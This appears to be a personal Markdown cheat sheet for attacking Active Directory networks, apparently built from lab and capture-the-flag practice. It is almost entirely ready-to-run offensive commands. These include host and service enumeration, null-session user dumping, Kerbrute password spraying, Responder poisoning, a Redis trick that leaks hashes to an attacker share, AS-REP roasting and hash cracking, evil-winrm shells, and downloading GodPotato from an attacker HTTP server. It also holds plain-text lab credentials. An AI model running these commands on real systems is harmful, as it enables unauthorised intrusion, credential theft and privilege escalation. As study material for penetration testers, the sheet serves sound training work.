
# Gathering NAMES

1- From web site its straight forward to gather info from the site or names
2- Getting RCE to one of the services or the users 
3- Github or Linked in u serach for the website name or domain name 

## Commands 

```
feroxbuster -u http://192.168.56.102/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -x php,asp,aspx,jsp,html,htm,js,txt,bak,old,zip,tar,gz,conf,log,py,db -t 40  
```

# Network Enum 

## Nmap 

- if u given a  newtork range find who is online 
```
sudo nmap -sn <ip/24> -oN hosts.txt
sed -n 's/^Nmap scan report for \([0-9.]*\).*/\1/p' hosts.txt > ips.txt
```
- full port scanning 
```
sudo nmap -Pn -n -sS -sV -sC -p- -T4 <ip> -oN ports.txt
```
-  find the dc on the network 
```
nmap -p 88 192.168.56.0/24
```
- Gathering info about dc 
```
nmap -p- -sC -sV -O -T4 192.168.56.102
```
- scripting eengines
```bash
#MSSQL
nmap -p 1433 --script ms-sql-info <TARGET_IP>
nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 <TARGET_IP>
nmap -p 1433 --script ms-sql-empty-password <TARGET_IP>
nmap -p 3306 --script ms-sql-query --script-args mssql.username=<USER>,mssql.password=<PW>,ms-sql-query.query="SELECT * FROM master..syslogins" <TARGET_IP> -oN output.txt
nmap -p 3306 --script ms-sql-dump-hashes --script-args mssql.username=<USER>,mssql.password=<PW> <TARGET_IP>
nmap -p 3306 --script ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mssql.password=<PW>,ms-sql-xp-cmdshell.cmd="ipconfig" <TARGET_IP>
nmap -p 3306 --script ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mssql.password=<PW>,ms-sql-xp-cmdshell.cmd="type c:\\flag.txt" <TARGET_IP>
```
- enum4linux 
```
 enum4linux -a 192.168.56.102
```

## Other Services 

- FTP 
```bash
#Check FTP login anonymous
ftp <ip>
username: anonymous
password: anonymous
#Download all available files on the target FTP server.
wget -m --no-passive ftp://anonymous:anonymous@<target>
```
- SMB 
```bash
#Null Session
smbclient -N -L //<FQDN/IP>
#List Everything Using via Null session
enum4linux -a <ip> 
#Connect SMB via User and pass 
smbclient -L //spookysec.local/ -U svc-admin
#Enum the SMB Via User and pass
enum4linux -a 10.64.131.97 -u svc-admin -p management2005
```
- NFS
```bash
# port 2049/tcp open  nlockmgr      1-4 (RPC #100021)
#Show available NFS shares.
showmount -e 10.82.138.75
#Mount the specific NFS share to ./target-NFS
mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock
or 
 sudo mkdir /mnt/razor_nfs
sudo mount -t nfs 10.82.138.75:/<share_name> /mnt/razor_nfs -o nolock
#Unmount the specific NFS share.

umount ./target-NFS
```
- SMTP 
```bash
telnet <FQDN/IP> 25
```
- IMAP/POP3
```bash
#Log in to the IMAPS service using cURL.
curl -k 'imaps://<FQDN/IP>' --user <user>:<password>
#Connect to the IMAPS service.
openssl s_client -connect <FQDN/IP>:imaps
#Connect to the POP3s service.
openssl s_client -connect <FQDN/IP>:pop3s
```
- LDAP / Host Names
```
ldapsearch -x -H ldap://10.67.161.134 -s base namingContexts dnsHostName
```

# AD (UN-Authenticated) Enumerating Users / Passwords

## (Null / Anonymous) Sessions

#### USERS

- SMB NULL Session
``` bash

########################################
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]”
##################################################
nxc smb 172.16.5.5 --users
#############################
enum4linux -u vulnnet-rst.local\\guest -a 10.67.161.134
#######################################################

smbclient \\\\10.65.179.110\\Users -U ""
smbclient \\\\10.65.179.110\\Users\ -N 
```
- LDAP Anonymous Session
```bash
# Dump all AD users via anonymous bind
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

#### Shares
```bash
netexec smb 10.80.130.248 -u '' -p '' --shares

netexec smb 10.80.167.120 -u 'guest' -p '' -M spider_plus -o DOWNLOAD_LF=False

netexec smb 10.80.167.120 -u 'guest' -p '' --shares
```
- access shared folder 
```bash
smbclient //10.80.167.120/VulnNet-Business-Anonymous -U 'guest'
```

- $IPC READ ENABLED
```

```


### Kerbrute and Users List

- Build a Users List
```bash
python3 namemash.py names.txt > all_names.txt
```
- Kerbrute Attack
```
kerbrute userenum --dc 10.129.239.180 -d ILF.local all_names.txt > kerbrute_output.txt 
```

```
grep "VALID USERNAME" kerbrute_output.txt | sed 's/\x1b\[[0-9;]*m//g' | sed -n 's/.*VALID USERNAME:[[:space:]]*\([^@]*\)@.*/\1/p' > valid_users.txt
```
### Enum The Users (Anonymous) 

- Impacket Anonymous Search Users (Unkown requirment fill it with geminin)
```bash
impacket-lookupsid anonymous@10.67.161.134
grep "SidTypeUser" users.txt | cut -d '\' -f2 | cut -d ' ' -f1 > newusers.txt
```
- Search for the users And Grep For Description
```
ldapsearch -x -H ldap://10.10.161.74 -b "dc=thm,dc=local" > ldapsearch.txt
```

## Password and Hash Gathering (Unauthenticated)
in this section we have a valid users 

### Password Spraying
- Kerbrute 
```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```
- NXC (SMB)
```bash
nxc smb 10.67.154.53 -u users.txt -p 'password123!' --continue-on-success | grep +
```
- Try The Username as Password
```
nxc smb soupdecode.local -u usernames.txt -p usernames.txt --no-brute --continue-on-success
```

### LLMNR/NBT-NS Poisoning
- Linux (Start Responder)
```
sudo responder  -I tun1 -w -d
```

then  or based on the case
```bash
redis-cli -h 10.80.130.248
10.80.130.248:6379> CONFIG SET dir \\192.168.134.35\share\fake.dll
(error) ERR Changing directory: Permission denied
(1.03s)
10.80.130.248:6379> CONFIG SET dbfilename test.rdb
OK
10.80.130.248:6379> Save
OK
```
- Crack Captured Hash (NetNTLMv2)
u can find hash mode on [example_hashes [hashcat wiki]](https://hashcat.net/wiki/doku.php?id=example_hashes)
```
# Crack the captured NTLMv2 hash using rockyou.txt
# Mode 5600 = NetNTLMv2
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
john --wordlist=wordlist.txt hash.txt
```

### AS-REP Roasting
Attacking users who have "Do not require Kerberos pre-authentication" enabled.

- Linux Impacket
``` bash
impacket-GetNPUsers controller.local/ -dc-ip 10.67.154.53 -usersfile users.txt -format john -outputfile crackme.txt -no-pass -request
```
for one user only 
``` bash
impacket-GetNPUsers fusion.corp/lparker -dc-ip 10.81.171.71 -no-pass -request -format john -outputfile crackme.txt
```

- Linux Kerbrute
```
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

- Windows (Require Auth of course RCE  and powerview and Rubeus.exe )
```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```
- Hash Cracking
```bash
# Crack the AS-REP hash
# Mode 18200 = Kerberos 5, etype 23, AS-REP
hashcat -m 18200 crackme.txt /usr/share/wordlists/rockyou.txt
john --wordlist=wordlist.txt hash.txt
```

# AD - Authenticated Enumeration

## TESTING CONNECTION

 
```
nxc smb 10.80.169.106 -u 'j.rock' -p 'Serviceworks1' -d services.local
```

getting shell 
```
evil-winrm -i 10.80.169.106 -u j.rock -p Serviceworks1
```

- disable restriction on rdp 
```bash
nxc smb 10.81.178.165 -u bradley_ortiz -p NewPassword123! -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
```

## Power View

how to move it 
first open http server 
```
python3 -m http.server 80
```
then inside ur shell
```bash
Invoke-WebRequest -Uri http://192.168.134.35:8000/GodPotato-NET4.exe -OutFile C:\temp\GodPotato-NET4.exe
```

- Get The User Groups 
```
Get-DomainGroup -MemberIdentity
or (no PowerView)
whoami /groups
```
- Get All Members from a group
```
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```
- Find The Users With SPN
```
Get-DomainUser -SPN
```

- Check The Services in Domain Admins Groups
```
Get-DomainUser -SPN | ?{$_.memberof -match ‘Domain Admins’}
```
- Check The Users That Doesn’t Have Pre Authentication
```
Get-DomainUser -PreauthNotRequired
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
```
- Check Users With SIDHistory Set
```
Get-DomainUser -LDAPFilter ‘(sidHistory=*)’
```
- Find any users/computers with Constrained Delegation
```
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```
- Find Users For Unconstrained Delegation
```
Get-DomainComputer -Unconstrained
Get-DomainUser -Unconstrained
```
- Find-InterestingDomainShareFile
```
$Password = “PASSWORD” | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential(“DOMAIN\user”,$Password)
Find-InterestingDomainShareFile -Domain DOMAIN -Credential $Credential
```
- Retrieve Most Users who can perform DC replication
```
Get-DomainObjectAcl “dc=dev,dc=testlab,dc=local” -ResolveGUIDs | ? {
($_.ObjectType -match ‘replication-get’) -or ($_.ActiveDirectoryRights -match ‘GenericAll’)
}
```
- Enum Users With Good Filters
```
Get-DomainUser | select SamAccountName,Description,DoesNotRequirePreAuth,ServicePrincipalNames,MemberOf,TrustedForDelegation,TrustedToAuthForDelegation,SID,BadLogonCount,pwdLastSet,logoncount
```
- Find Your User ACLs
```
Invoke-ACLScanner -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "username"}
```
- Find What Users You Have ACLs on it
```
Invoke-ACLScanner -ResolveGUIDs |
    Where-Object { $_.IdentityReferenceName -match "username" } |
    Select-Object ObjectDN, ActiveDirectoryRights
```

## Blood Hound

- RustHound ZIP File
```bash
rusthound -d k2.thm -u 'r.bud' -p 'vRMkaVgdfxhW!8' -i 10.81.165.72 --zip -o k2.thm.zip
```
- windows
after u transfer sharphound.exe
```powershell
.\sharphound.exe -c all
```

##  LDAP SEARCH
```
 ldapsearch -x -H ldap://10.65.130.11 -D "lparker@fusion.corp"  w '!!abbylvzsvs2k6!'  -b "DC=fusion,DC=corp" > ldapsearch.txt 
 cat ldapsearch.txt | grep description
```


# AD Attacks

### Credentials Dumping Attacks
- Reused Password Spraying

```
sudo nxc smb --local-auth 172.16.5.0/24 -u administrator -p password | grep +
```
